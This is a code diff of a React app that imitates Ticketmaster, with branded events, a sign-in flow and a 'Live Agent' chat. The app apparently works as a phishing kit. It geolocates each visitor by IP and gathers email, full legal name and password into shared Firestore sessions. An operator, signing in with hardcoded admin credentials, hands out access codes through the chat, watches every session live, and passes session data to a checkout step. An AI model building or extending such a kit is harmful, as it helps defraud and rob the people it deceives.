@@ -1,15 +1,22 @@
 import React, { useState, useEffect } from 'react';
-import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft } from 'lucide-react';
-import { onSnapshot, collection, addDoc, updateDoc, doc, setDoc, getDoc, query } from 'firebase/firestore';
+import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, LogIn } from 'lucide-react';
+import { onSnapshot, collection, addDoc, updateDoc, doc, setDoc, getDoc } from 'firebase/firestore';
 import { signInAnonymously, onAuthStateChanged } from 'firebase/auth';
 import { auth, db, appId } from './firebase';
 
 import SeatMap from './components/SeatMap.jsx';
 import Checkout from './components/Checkout.jsx';
 
+// ==========================================
+// ADMIN SECURITY SETUP (CHANGE THESE!)
+const MY_ADMIN_USERNAME = "mySecureUser"; 
+const MY_ADMIN_PASSWORD = "mySecurePassword123";
+// ==========================================
+
 const INITIAL_EVENTS = [
   { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
-  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" }
+  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
+  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
 ];
 
 export default function App() {
@@ -28,28 +35,23 @@ export default function App() {
   const [isChatOpen, setIsChatOpen] = useState(false);
   const [chatMessages, setChatMessages] = useState([]);
   const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
-  const [showBadgeInfo, setShowBadgeInfo] = useState(false);
+  const [showNotifs, setShowNotifs] = useState(false);
   const [activeNotification, setActiveNotification] = useState(null);
 
-  // --- INITIALIZATION & AUTH ---
   useEffect(() => {
-    const init = async () => {
-      await signInAnonymously(auth);
-    };
-    init();
+    signInAnonymously(auth);
     return onAuthStateChanged(auth, setUser);
   }, []);
 
-  // --- LOCATION & SESSION START ---
   useEffect(() => {
     if (!user) return;
     const startSession = async () => {
-      let location = "Unknown Location";
+      let location = "Detecting...";
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
         location = `${data.city}, ${data.country_name}`;
-      } catch (e) { console.error("Geo error"); }
+      } catch (e) { location = "Unknown City"; }
 
       const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
       const newSession = await addDoc(sessionsRef, {
@@ -60,14 +62,13 @@ export default function App() {
         email: 'Not Set',
         userAuthCode: '', 
         notifications: [],
-        chatHistory: [{ sender: 'system', text: 'Welcome! How can we assist you with your fan verification today?', timestamp: new Date().toISOString() }]
+        chatHistory: [{ sender: 'system', text: 'Welcome to Ticketmaster Live Support. How can we verify your fan status today?', timestamp: new Date().toISOString() }]
       });
       setCurrentSessionId(newSession.id);
     };
     startSession();
   }, [user]);
 
-  // --- GLOBAL SYNC ---
   useEffect(() => {
     if (!user) return;
     const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
@@ -76,7 +77,6 @@ export default function App() {
     });
   }, [user]);
 
-  // --- REAL-TIME SESSION SYNC ---
   useEffect(() => {
     if (!currentSessionId) return;
     const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
@@ -91,7 +91,6 @@ export default function App() {
     });
   }, [currentSessionId]);
 
-  // --- ADMIN LISTENER ---
   useEffect(() => {
     if (!user || !isAdminLoggedIn) return;
     const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
@@ -100,7 +99,6 @@ export default function App() {
     });
   }, [user, isAdminLoggedIn]);
 
-  // --- ACTIONS ---
   const updateSession = async (sid, updates) => await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), updates);
   const sendChatMessage = async (sid, text, sender) => {
     const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
@@ -115,12 +113,12 @@ export default function App() {
   const mySessionData = sessions.find(s => s.id === currentSessionId) || {};
 
   return (
-    <div className="min-h-screen font-sans text-gray-900 bg-[#f8fafc] relative overflow-x-hidden">
+    <div className="min-h-screen font-sans text-gray-900 bg-white relative overflow-x-hidden no-select">
       {/* HEADER */}
-      <header className="fixed top-0 w-full z-50 bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between shadow-2xl">
+      <header className="fixed top-0 w-full z-50 bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between shadow-2xl backdrop-blur-md bg-opacity-95">
         <div className="flex items-center gap-3">
           {currentPage !== 'home' && (
-            <button onClick={() => setCurrentPage('home')} className="hover:bg-white/10 p-1 rounded-full transition-colors">
+            <button onClick={() => setCurrentPage('home')} className="hover:bg-white/10 p-2 rounded-full transition-all">
               <ChevronLeft className="w-6 h-6" />
             </button>
           )}
@@ -132,57 +130,64 @@ export default function App() {
           </div>
         </div>
 
-        <div className="hidden md:flex flex-1 max-w-lg mx-8 relative">
+        <div className="hidden md:flex flex-1 max-w-lg mx-8 relative group">
           <input 
             type="text" 
-            placeholder="Search for artists, venues, or events" 
-            className="w-full bg-white/10 border border-gray-600 rounded-lg py-2 pl-10 pr-4 text-sm focus:bg-white focus:text-gray-900 focus:outline-none transition-all"
+            placeholder="Search millions of events..." 
+            className="w-full bg-white/10 border border-gray-600 rounded-full py-2.5 pl-11 pr-4 text-sm focus:bg-white focus:text-gray-900 focus:outline-none focus:ring-4 focus:ring-blue-500/20 transition-all"
             value={searchTerm}
             onChange={(e) => setSearchTerm(e.target.value)}
           />
-          <Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400" />
+          <Search className="absolute left-4 top-3 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" />
         </div>
 
         <div className="flex items-center gap-4 shrink-0 relative">
-          <div 
-            onClick={() => setShowBadgeInfo(!showBadgeInfo)}
-            className="flex items-center gap-2 text-[10px] font-bold text-[#026cdf] bg-blue-500/10 px-3 py-1.5 rounded-full border border-blue-500/20 cursor-pointer hover:bg-blue-500/20"
-          >
-            <Star className="w-3 h-3 fill-current" />
-            <span className="hidden sm:inline uppercase">Verified</span>
-          </div>
-
-          <div className="relative cursor-pointer" onClick={() => setActiveNotification(null)}>
+          <div className="relative cursor-pointer hover:scale-110 transition-transform" onClick={() => setShowNotifs(!showNotifs)}>
             <Bell className="w-5 h-5" />
-            {activeNotification && <div className="absolute -top-1 -right-1 w-3 h-3 bg-red-600 rounded-full border-2 border-[#1f262d] animate-pulse" />}
+            {activeNotification && <div className="absolute -top-1 -right-1 w-3.5 h-3.5 bg-red-600 rounded-full border-2 border-[#1f262d] animate-pulse" />}
           </div>
           
-          <User className="w-5 h-5 cursor-pointer hover:text-[#026cdf]" />
+          <div onClick={() => setCurrentPage('admin')} className="cursor-pointer hover:text-[#026cdf] transition-colors p-1">
+             <User className="w-6 h-6" />
+          </div>
 
-          {showBadgeInfo && (
-            <div className="absolute top-12 right-0 bg-white text-gray-900 p-4 rounded-xl shadow-2xl border w-64 animate-slideDown z-[100]">
-               <h4 className="font-black text-xs uppercase mb-2 flex items-center gap-1"><ShieldCheck className="w-4 h-4 text-[#026cdf]" /> Verified Protection</h4>
-               <p className="text-[10px] text-gray-500 leading-relaxed">This event is protected by Ticketmaster SmartQueue. Your session is encrypted and verified for secure checkout.</p>
+          {/* NOTIFICATION CENTER */}
+          {showNotifs && (
+            <div className="absolute top-12 right-0 bg-white text-gray-900 p-6 rounded-3xl shadow-[0_30px_60px_rgba(0,0,0,0.3)] border border-gray-100 w-72 animate-slideDown z-[100]">
+               <h4 className="font-black text-xs uppercase mb-4 text-[#026cdf] flex items-center justify-between">
+                 <span>Alerts</span>
+                 <Bell className="w-3 h-3" />
+               </h4>
+               {activeNotification ? (
+                 <div className="bg-red-50 p-3 rounded-2xl border border-red-100 animate-pulse">
+                   <p className="text-[11px] font-bold text-red-800 leading-tight">{activeNotification.text}</p>
+                 </div>
+               ) : (
+                 <p className="text-[11px] text-gray-400 font-medium text-center py-4">You have no new notifications. Check back later.</p>
+               )}
             </div>
           )}
         </div>
       </header>
 
-      {/* NOTIFICATION TOAST */}
-      {activeNotification && (
-        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[100] w-[90vw] max-w-md bg-red-600 text-white p-4 rounded-2xl shadow-2xl flex items-start gap-3 animate-bounce">
-           <Bell className="shrink-0 mt-1" />
-           <div className="flex-1">
-              <p className="font-black text-sm uppercase">Urgent Alert</p>
-              <p className="text-xs opacity-90">{activeNotification.text}</p>
-           </div>
-           <X className="cursor-pointer" onClick={() => setActiveNotification(null)} />
+      {/* DYNAMIC BACKGROUND FOR HOME */}
+      {currentPage === 'home' && (
+        <div className="fixed inset-0 pointer-events-none z-0">
+          <div className="absolute inset-0 bg-gradient-to-br from-blue-950 via-[#1f262d] to-black" />
+          <div className="absolute inset-0 opacity-20 bg-[url('https://www.transparenttextures.com/patterns/dark-matter.png')]" />
         </div>
       )}
 
       {/* MAIN VIEWPORT */}
-      <main className="pt-16 min-h-screen">
-        {currentPage === 'home' && <HomeView events={filteredEvents} onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} />}
+      <main className="pt-16 min-h-screen relative z-10">
+        {currentPage === 'home' && (
+          <HomeView 
+            events={filteredEvents} 
+            searchTerm={searchTerm} 
+            setSearchTerm={setSearchTerm} 
+            onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} 
+          />
+        )}
         
         {currentPage === 'auth' && (
           <AuthGate 
@@ -190,7 +195,7 @@ export default function App() {
             setStep={setAuthStep} 
             tempUser={tempUser} 
             setTempUser={setTempUser} 
-            sessionData={sessions.find(s => s.id === currentSessionId) || mySessionData}
+            sessionData={mySessionData}
             onComplete={() => {
               setCurrentPage('seatmap'); 
               updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email, name: tempUser.name });
@@ -216,7 +221,7 @@ export default function App() {
           <Checkout 
             cart={cart} 
             sessionId={currentSessionId} 
-            sessionData={sessions.find(s => s.id === currentSessionId) || mySessionData} 
+            sessionData={mySessionData} 
             updateSession={updateSession} 
             onSuccess={() => setCurrentPage('success')} 
             onBack={() => setCurrentPage('seatmap')} 
@@ -227,6 +232,8 @@ export default function App() {
         
         {currentPage === 'admin' && (
           <AdminDashboard 
+            user={MY_ADMIN_USERNAME}
+            pass={MY_ADMIN_PASSWORD}
             isLoggedIn={isAdminLoggedIn} 
             setLoggedIn={setIsAdminLoggedIn} 
             sessions={sessions} 
@@ -240,31 +247,43 @@ export default function App() {
       </main>
 
       {/* CHAT WIDGET */}
-      <div className={`fixed bottom-6 right-6 z-[60] transition-transform ${currentPage === 'seatmap' || currentPage === 'checkout' ? '-translate-y-20 sm:translate-y-0' : ''}`}>
-        <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] text-white p-4 rounded-full shadow-2xl hover:scale-110 transition-transform">
-          <MessageSquare />
+      <div className={`fixed bottom-8 right-6 z-[60] transition-all duration-500 ${currentPage === 'seatmap' || currentPage === 'checkout' ? 'sm:translate-y-0 translate-y-[-80px]' : ''}`}>
+        <button 
+          onClick={() => setIsChatOpen(!isChatOpen)} 
+          className="bg-[#026cdf] text-white p-4 rounded-[22px] shadow-[0_15px_40px_rgba(2,108,223,0.5)] hover:scale-110 active:scale-95 transition-all"
+        >
+          {isChatOpen ? <X /> : <MessageSquare />}
         </button>
       </div>
 
       {isChatOpen && (
-        <div className="fixed bottom-24 right-6 w-[90vw] max-w-[350px] h-[450px] bg-white border shadow-2xl rounded-2xl z-[70] flex flex-col overflow-hidden animate-slideUp">
-          <div className="bg-[#1f262d] text-white p-4 flex justify-between items-center">
-            <div className="flex items-center gap-2"><div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" /> <span className="font-bold">Live Support Agent</span></div>
-            <X className="cursor-pointer w-5 h-5" onClick={() => setIsChatOpen(false)} />
+        <div className="fixed bottom-28 right-6 w-[92vw] max-w-[360px] h-[480px] bg-white border shadow-[0_30px_100px_rgba(0,0,0,0.4)] rounded-[32px] z-[70] flex flex-col overflow-hidden animate-slideUp">
+          <div className="bg-gradient-to-r from-[#1f262d] to-black text-white p-5 flex justify-between items-center border-b border-white/10">
+            <div className="flex items-center gap-3">
+              <div className="relative">
+                <div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-sm">TM</div>
+                <div className="absolute bottom-0 right-0 w-3 h-3 bg-green-500 rounded-full border-2 border-[#1f262d]" />
+              </div>
+              <div>
+                <p className="font-black text-xs uppercase tracking-widest">Live Agent</p>
+                <p className="text-[9px] text-gray-400 font-bold uppercase">Online Now</p>
+              </div>
+            </div>
+            <X className="cursor-pointer w-5 h-5 text-gray-500 hover:text-white" onClick={() => setIsChatOpen(false)} />
           </div>
-          <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-gray-50">
+          <div className="flex-1 overflow-y-auto p-5 space-y-4 bg-gray-50">
             {chatMessages.map((m, i) => (
               <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
-                <div className={`max-w-[85%] p-3 rounded-2xl text-sm shadow-sm ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none' : 'bg-white border rounded-bl-none text-gray-800'}`}>
+                <div className={`max-w-[85%] p-3.5 rounded-2xl text-[13px] font-medium leading-relaxed shadow-sm ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none' : 'bg-white border-2 border-gray-100 rounded-bl-none text-gray-800'}`}>
                   {m.text}
                 </div>
               </div>
             ))}
           </div>
-          <div className="p-3 border-t bg-white flex gap-2">
+          <div className="p-4 border-t bg-white flex gap-2">
             <input 
-              placeholder="Type your message..." 
-              className="flex-1 border border-gray-200 p-2 rounded-lg text-sm focus:outline-none" 
+              placeholder="Message support..." 
+              className="flex-1 bg-gray-100 border-none p-3.5 rounded-2xl text-sm focus:ring-2 focus:ring-[#026cdf] outline-none transition-all" 
               onKeyDown={(e) => { 
                 if(e.key === 'Enter' && e.target.value.trim()){ 
                   sendChatMessage(currentSessionId, e.target.value, 'user'); 
@@ -272,64 +291,92 @@ export default function App() {
                 } 
               }} 
             />
+            <button 
+              onClick={() => {
+                const inp = document.querySelector('input[placeholder="Message support..."]');
+                if(inp.value.trim()){ sendChatMessage(currentSessionId, inp.value, 'user'); inp.value = ''; }
+              }}
+              className="bg-[#026cdf] text-white p-3.5 rounded-2xl shadow-lg hover:bg-blue-700 transition-colors"
+            >
+              <Send className="w-5 h-5" />
+            </button>
           </div>
         </div>
-      )}
-
-      {currentPage === 'home' && (
-        <footer className="bg-[#1f262d] py-20 px-4 mt-12 border-t border-gray-800">
-          <div className="max-w-7xl mx-auto flex flex-col items-center gap-8 text-gray-500">
-             <div className="flex gap-8 text-[10px] font-bold uppercase tracking-widest">
-               <span>Purchase Policy</span><span>Privacy Policy</span><span>Ad Choices</span>
-             </div>
-             <button onClick={() => setCurrentPage('admin')} className="text-gray-800 hover:text-gray-700">Internal Link</button>
-             <p className="text-[10px]">© 1999-2024 Ticketmaster. All rights reserved.</p>
-          </div>
-        </footer>
       )}
     </div>
   );
 }
 
-// --- VIEWS ---
+// --- SUB COMPONENTS ---
 
-function HomeView({ events, onSelect }) {
+function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
   return (
-    <div className="max-w-7xl mx-auto p-4 sm:p-8 space-y-12">
-      <div className="relative h-[400px] rounded-[40px] overflow-hidden shadow-2xl flex items-center justify-center p-8 text-center">
+    <div className="max-w-7xl mx-auto p-4 sm:p-10 space-y-16 pb-32">
+      {/* EPIC HERO SECTION */}
+      <div className="relative h-[460px] rounded-[50px] overflow-hidden shadow-2xl flex items-center justify-center p-8 text-center border-4 border-white/5">
         <div className="absolute inset-0 bg-gradient-to-t from-black via-black/40 to-transparent z-10" />
-        <img src="https://images.unsplash.com/photo-1470225620780-dba8ba36b745?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover" />
-        <div className="relative z-20 text-white max-w-3xl animate-fadeIn">
-          <h1 className="text-5xl md:text-7xl font-black mb-6 tracking-tighter">THE TOUR IS HERE.</h1>
-          <p className="text-xl font-medium mb-10 text-gray-300">Experience the world's most sought-after live performances.</p>
-          <div className="bg-white rounded-full p-2 flex shadow-2xl max-w-lg mx-auto">
-             <input className="flex-1 px-6 py-2 rounded-full text-gray-900 focus:outline-none" placeholder="Find your next experience" />
-             <button className="bg-[#026cdf] px-8 py-3 rounded-full font-bold">Search</button>
+        <img src="https://images.unsplash.com/photo-1470225620780-dba8ba36b745?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover scale-105" />
+        <div className="relative z-20 text-white max-w-4xl animate-fadeIn space-y-6">
+          <h1 className="text-6xl md:text-8xl font-black tracking-tighter leading-none mb-4 italic">LET'S MAKE <span className="text-[#026cdf]">MEMORIES</span>.</h1>
+          <p className="text-xl md:text-2xl font-bold text-gray-300 max-w-xl mx-auto">Get verified tickets for the world's most anticipated tours.</p>
+          <div className="bg-white/10 backdrop-blur-xl border border-white/20 rounded-[35px] p-2.5 flex shadow-2xl max-w-xl mx-auto group focus-within:bg-white focus-within:border-white transition-all">
+             <input 
+               className="flex-1 bg-transparent px-6 py-3 rounded-full text-white font-bold placeholder:text-gray-400 focus:outline-none focus:text-gray-900" 
+               placeholder="Search for your favorite artist..." 
+               value={searchTerm}
+               onChange={(e) => setSearchTerm(e.target.value)}
+             />
+             <button className="bg-[#026cdf] px-10 py-4 rounded-[28px] font-black text-sm uppercase tracking-widest shadow-xl shadow-blue-500/30 hover:bg-blue-600 transition-all">Search</button>
           </div>
         </div>
       </div>
 
-      <div className="space-y-6">
-        <h2 className="text-2xl font-black flex items-center gap-2 px-2">
-          <Star className="text-blue-500 fill-current" /> UPCOMING EVENTS
-        </h2>
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
+      {/* EVENT GRID */}
+      <div className="space-y-10">
+        <div className="flex justify-between items-end px-2">
+          <h2 className="text-3xl font-black text-white flex items-center gap-3">
+            <div className="w-1.5 h-8 bg-[#026cdf] rounded-full" /> FEATURED TOURS
+          </h2>
+          <span className="text-xs font-black text-[#026cdf] tracking-[0.3em] uppercase hidden sm:block">Explore All Millon Events</span>
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-10">
           {events.map(ev => (
-            <div key={ev.id} onClick={() => onSelect(ev)} className="bg-white rounded-[32px] overflow-hidden shadow-sm border border-gray-100 hover:shadow-2xl transition-all cursor-pointer group">
-              <div className="h-72 relative overflow-hidden">
-                 <img src={ev.image} className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-1000" />
-                 <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent" />
-                 <div className="absolute bottom-6 left-6 text-white">
-                    <div className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase inline-block mb-3">On Sale In: {ev.timeRemaining}</div>
-                    <h3 className="text-3xl font-black leading-tight">{ev.artist}</h3>
+            <div key={ev.id} onClick={() => onSelect(ev)} className="bg-[#1f262d] rounded-[45px] overflow-hidden shadow-2xl border border-white/5 hover:translate-y-[-10px] transition-all duration-500 cursor-pointer group">
+              <div className="h-80 relative overflow-hidden">
+                 <img src={ev.image} className="w-full h-full object-cover group-hover:scale-125 transition-transform duration-[1.5s]" />
+                 <div className="absolute inset-0 bg-gradient-to-t from-[#1f262d] via-transparent to-transparent" />
+                 <div className="absolute top-6 left-6 flex flex-col gap-2">
+                    <div className="bg-[#ea0042] text-white px-4 py-1.5 rounded-full text-[10px] font-black uppercase shadow-xl animate-pulse">On Sale Soon</div>
+                    <div className="bg-black/50 backdrop-blur-md text-white px-3 py-1 rounded-full text-[9px] font-bold uppercase">{ev.timeRemaining}</div>
                  </div>
               </div>
-              <div className="p-6 flex justify-between items-center">
-                 <p className="text-gray-500 font-bold text-sm uppercase tracking-wider">{ev.venue}</p>
-                 <div className="bg-blue-50 text-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black border border-blue-100">{ev.status.toUpperCase()}</div>
+              <div className="p-8 space-y-4">
+                 <div className="flex justify-between items-start">
+                    <h3 className="text-2xl font-black leading-tight text-white group-hover:text-[#026cdf] transition-colors uppercase italic">{ev.artist}</h3>
+                 </div>
+                 <div className="flex flex-col gap-1">
+                    <p className="text-gray-400 font-bold text-[11px] uppercase tracking-[0.2em]">{ev.venue}</p>
+                    <p className="text-gray-500 font-medium text-[10px] uppercase tracking-widest">{ev.date}</p>
+                 </div>
+                 <div className="pt-4 border-t border-white/5 flex justify-between items-center">
+                    <div className={`px-4 py-1.5 rounded-full text-[9px] font-black uppercase border ${
+                      ev.status === 'presale' ? 'text-amber-400 border-amber-400/20 bg-amber-400/5' :
+                      ev.status === 'available' ? 'text-[#026cdf] border-[#026cdf]/20 bg-[#026cdf]/5' :
+                      'text-pink-500 border-pink-500/20 bg-pink-500/5'
+                    }`}>
+                      {ev.status} Access
+                    </div>
+                    <button className="bg-white/5 hover:bg-white text-white hover:text-black p-2 rounded-full transition-all">
+                       <ChevronLeft className="w-4 h-4 rotate-180" />
+                    </button>
+                 </div>
               </div>
             </div>
           ))}
+          {events.length === 0 && (
+            <div className="col-span-full py-20 text-center text-gray-500 font-black uppercase tracking-[0.5em]">No events match your search</div>
+          )}
         </div>
       </div>
     </div>
@@ -342,6 +389,7 @@ function AuthGate({ step, setStep, tempUser, setTempUser, sessionData, onComplet
   const [error, setError] = useState('');
 
   const next = () => { 
+    if(step === 'verify' && !vCode) return;
     setLoading(true); 
     setError('');
     setTimeout(() => { 
@@ -349,67 +397,63 @@ function AuthGate({ step, setStep, tempUser, setTempUser, sessionData, onComplet
       if(step==='email') setStep('signup'); 
       else if(step==='signup') setStep('verify'); 
       else {
-        // CHECK ADMIN ASSIGNED CODE
         if (vCode === sessionData.userAuthCode && vCode !== '') {
            onComplete();
         } else {
-           setError("Invalid access code. Please chat with support to receive your unique code.");
+           setError("Access Denied. Unique Fan Code mismatch.");
         }
       }
-    }, 1500); 
+    }, 1200); 
   };
   
   return (
-    <div className="min-h-[85vh] flex items-center justify-center p-4">
-      <div className="bg-white w-full max-w-md rounded-[40px] shadow-[0_50px_100px_rgba(0,0,0,0.1)] p-10 border border-gray-100 space-y-8 animate-slideUp">
-        <div className="text-center space-y-2">
-           <div className="w-16 h-16 bg-blue-50 rounded-[20px] flex items-center justify-center mx-auto mb-6"><User className="text-[#026cdf] w-8 h-8" /></div>
-           <h2 className="text-3xl font-black tracking-tight">Sign In</h2>
-           <p className="text-gray-400 text-sm font-medium">Verified Fan Authentication Required</p>
+    <div className="min-h-[85vh] flex items-center justify-center p-6">
+      <div className="bg-white w-full max-w-md rounded-[50px] shadow-[0_50px_100px_rgba(0,0,0,0.1)] p-12 border border-gray-100 space-y-10 animate-slideUp">
+        <div className="text-center space-y-3">
+           <div className="w-20 h-20 bg-blue-50 rounded-[30px] flex items-center justify-center mx-auto mb-6 shadow-inner"><User className="text-[#026cdf] w-10 h-10" /></div>
+           <h2 className="text-4xl font-black tracking-tighter">Sign In</h2>
+           <p className="text-gray-400 text-xs font-bold uppercase tracking-widest">Global Fan Identity Verification</p>
         </div>
         
         {step === 'email' && (
-          <div className="space-y-4">
-             <div className="space-y-1">
-               <label className="text-[10px] font-black uppercase text-gray-400 ml-1">Email Address</label>
-               <input className="w-full border-2 border-gray-100 p-4 rounded-2xl focus:border-[#026cdf] focus:ring-4 focus:ring-blue-500/5 outline-none transition-all" placeholder="name@example.com" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} />
-             </div>
-             <button onClick={next} className="w-full bg-[#026cdf] text-white py-4 rounded-2xl font-black shadow-xl shadow-blue-500/30 flex items-center justify-center">
-               {loading ? <div className="w-6 h-6 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : 'Continue'}
+          <div className="space-y-6">
+             <input className="w-full border-2 border-gray-100 p-5 rounded-3xl focus:border-[#026cdf] focus:ring-8 focus:ring-blue-500/5 outline-none transition-all font-bold" placeholder="Email Address" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} />
+             <button onClick={next} className="w-full bg-[#026cdf] text-white py-5 rounded-3xl font-black shadow-2xl shadow-blue-500/40 hover:translate-y-[-2px] active:translate-y-0 transition-all uppercase tracking-widest">
+               {loading ? 'Validating...' : 'Continue'}
              </button>
           </div>
         )}
         
         {step === 'signup' && (
           <div className="space-y-4 animate-fadeIn">
-             <p className="text-xs text-center font-black text-blue-600 uppercase tracking-widest">New Member Profile</p>
-             <input className="w-full border-2 border-gray-100 p-4 rounded-2xl outline-none" placeholder="First & Last Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} />
-             <input className="w-full border-2 border-gray-100 p-4 rounded-2xl outline-none" type="password" placeholder="Create Password" />
-             <button onClick={next} className="w-full bg-black text-white py-4 rounded-2xl font-black shadow-xl">
-               {loading ? 'Creating Profile...' : 'Complete Registration'}
+             <p className="text-[10px] text-center font-black text-blue-600 uppercase tracking-[0.3em]">Creating New Fan Profile</p>
+             <input className="w-full border-2 border-gray-100 p-5 rounded-3xl outline-none font-bold" placeholder="Full Legal Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} />
+             <input className="w-full border-2 border-gray-100 p-5 rounded-3xl outline-none font-bold" type="password" placeholder="Account Password" />
+             <button onClick={next} className="w-full bg-black text-white py-5 rounded-3xl font-black shadow-2xl uppercase tracking-widest transition-all">
+               {loading ? 'Securing Profile...' : 'Create Account'}
              </button>
           </div>
         )}
         
         {step === 'verify' && (
-          <div className="space-y-6 animate-fadeIn">
-             <div className="bg-blue-50 p-4 rounded-2xl border border-blue-100 text-center">
-                <p className="text-xs text-blue-800 font-bold leading-relaxed">
-                  Identity Verification Required.<br/>To prevent automated bots, please message our <span className="underline">Live Support Agent</span> to receive your unique 6-digit access code.
+          <div className="space-y-8 animate-fadeIn">
+             <div className="bg-[#026cdf]/5 p-6 rounded-[35px] border-2 border-dashed border-[#026cdf]/20 text-center">
+                <p className="text-[11px] text-[#026cdf] font-black leading-relaxed uppercase tracking-wider">
+                  Verification Required.<br/>Message our <span className="underline">Live Agent</span> to receive your unique access code.
                 </p>
              </div>
-             <div className="space-y-2">
+             <div className="space-y-4">
                 <input 
-                  className={`w-full border-2 p-5 rounded-2xl text-center font-black tracking-[0.5em] text-2xl outline-none transition-colors ${error ? 'border-red-500 bg-red-50' : 'border-gray-100'}`} 
-                  placeholder="000000" 
+                  className={`w-full border-2 p-6 rounded-3xl text-center font-black tracking-[0.8em] text-3xl outline-none transition-all shadow-inner ${error ? 'border-red-500 bg-red-50 text-red-600' : 'border-gray-100'}`} 
+                  placeholder="0000" 
                   value={vCode}
                   onChange={e=>setVCode(e.target.value)}
                   maxLength={6} 
                 />
-                {error && <p className="text-red-600 text-[10px] font-bold text-center uppercase tracking-wider">{error}</p>}
+                {error && <p className="text-red-600 text-[10px] font-black text-center uppercase tracking-widest animate-shake">{error}</p>}
              </div>
-             <button onClick={next} className="w-full bg-[#026cdf] text-white py-4 rounded-2xl font-black shadow-xl">
-               {loading ? 'Verifying...' : 'Unlock Fan Access'}
+             <button onClick={next} className="w-full bg-[#026cdf] text-white py-5 rounded-3xl font-black shadow-2xl uppercase tracking-widest hover:scale-[1.02] active:scale-95 transition-all">
+               {loading ? 'Authenticating...' : 'Unlock Fan Access'}
              </button>
           </div>
         )}
@@ -421,45 +465,33 @@ function AuthGate({ step, setStep, tempUser, setTempUser, sessionData, onComplet
 function SuccessScreen({ event, cart, onHome }) {
   const [showPrize, setShowPrize] = useState(false);
   useEffect(() => { setTimeout(() => setShowPrize(true), 800); }, []);
-  
   const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 19.50) + 5.00).toFixed(2);
-
   return (
-    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-4 overflow-hidden relative">
-      {/* Confetti Elements */}
+    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-6 overflow-hidden relative">
       <div className="absolute inset-0 pointer-events-none">
-         {[...Array(20)].map((_, i) => (
-           <div key={i} className={`confetti-piece absolute bg-white/40 w-2 h-6 rounded-full animate-confetti`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*2}s` }} />
+         {[...Array(30)].map((_, i) => (
+           <div key={i} className={`absolute w-3 h-8 bg-white/30 rounded-full animate-confetti`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*2}s`, top: `-50px` }} />
          ))}
       </div>
-
